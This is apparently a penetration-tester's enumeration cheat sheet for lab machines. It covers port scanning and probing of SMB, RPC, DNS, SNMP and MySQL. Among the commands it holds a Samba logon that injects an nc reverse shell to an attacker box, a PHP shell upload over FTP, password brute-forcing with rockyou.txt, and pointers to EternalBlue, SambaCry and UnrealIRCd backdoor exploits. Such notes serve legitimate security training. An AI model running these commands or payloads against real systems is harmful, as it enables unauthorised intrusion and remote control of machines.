
### Quick Hits

```
enum4linux -a 10.10.10.10
autorecon
```

### Port Scanning 

```
Host Discovery
	nmap -sn 10.10.0.1-254 -vv -oA hosts
	netdiscover -r 10.10.10.0/24
	nmap -sP 10.10.10.0/16

DNS server discovery
	nmap -p 53 10.10.10.1-254 -vv -oA DCs

Scans 
	nmap -F 10.10.10.10
	nmap -p- -A 10.10.10.10 -oA aggressive
	nmap -sV -p <ports> --script "vuln" 10.10.10.10

Scripts
	nmap -sV --script=vulscan/vulscan.nse (https://securitytrails.com/blog/nmap-vulnerability-scan)
	ls /usr/share/nmap/scripts/ssh*
	ls /usr/share/nmap/scripts/smb*

```

### FTP 

- anonymous login check
- ftp 10.10.10.10
- creds anonymous:anonymous
- put SHELL.php

### SSH

- id_rsa.pub = public authorized key 
- id_rsa =  private key (can crack with `ssh2john` )
- ssh -i id_rsa user@10.10.10.10 

### DNS

- check if port 53 is open -> if so add to /etc/hosts
- dig axfr smasher.htb @10.10.10.135
	- Add the extracted domain to /etc/hosts and dig again

### RPC Bind - 111

```
rpcclient --user="" --command=enumprivs -N 10.10.10.10
rpcinfo –p 10.10.10.10
rpcbind -p 10.10.10.10
```

### RPC - 135

```
rpcdump.py 10.10.10.10  -p 135                           //Impacket 
rpcdump.py 10.10.10.10 -p 135 | grep ncacn_np            //Get pipe names
rpcmap.py ncacn_ip_tcp:10.10.10.10 [135]
```

### SMB 

```
nmap --script smb-protocols 10.10.10.10

smbclient -L //10.10.10.10
smbclient -L //10.10.10.10 -N                   //No password (SMB Null session)
smbclient --no-pass -L 10.10.10.10
smbclient //10.10.10.10/share_name

smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u '' -p ''
smbmap -H 10.10.10.10 -s share_name

crackmapexec smb 10.10.10.10 -u '' -p '' --shares
crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares
crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares
crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name
crackmapexec smb 192.168.0.115 -u '' -p '' --shares --pass-pol

rpcclient -U "" 10.10.10.10 
	- * enumdomusers
	- enumdomgroups
	- queryuser [rid]
	- getdompwinfo
	- * getusrdompwinfo [rid]

ncrack -u username -P rockyou.txt -T 5 10.10.10.10 -p smb -v

mount -t cifs "//10.10.10.10/share/" /mnt/dubs
mount -t cifs "//10.10.10.10/share/" /mnt/dubs -o vers=1.0,user=root,uid=0,gid=0
```

SMB Shell to Reverse Shell :

```
smbclient -U "username%password" //10.10.10.10/sharename
smb> logon “/=nc ‘attack box ip’ 4444 -e /bin/bash"

smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234

```

SMB Exploits:

- Samba usermap script (version **3.0.20** through **3.0.25rc3**)
	- use Samba-usermap-exploit.py
- Eternal Blue (requires SMBv1)
	- use MS17-010-Manual-Exploit
- SambaCry (version 4.5.9 and before )
	- use exploit-CVE-2017-7494

### SNMP - 161

```
snmpwalk -c public -v1 10.0.0.0
snmpcheck -t 192.168.1.X -c public
onesixtyone -c names -i hosts
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
snmpenum -t 192.168.1.X
```

### IRC - 194, 6667, 6660-7000

```
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 10.10.10.10
```

- Use UnrealIRCd-3.2.8.1-Backdoor 

### MySQL - 3306

```
nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
```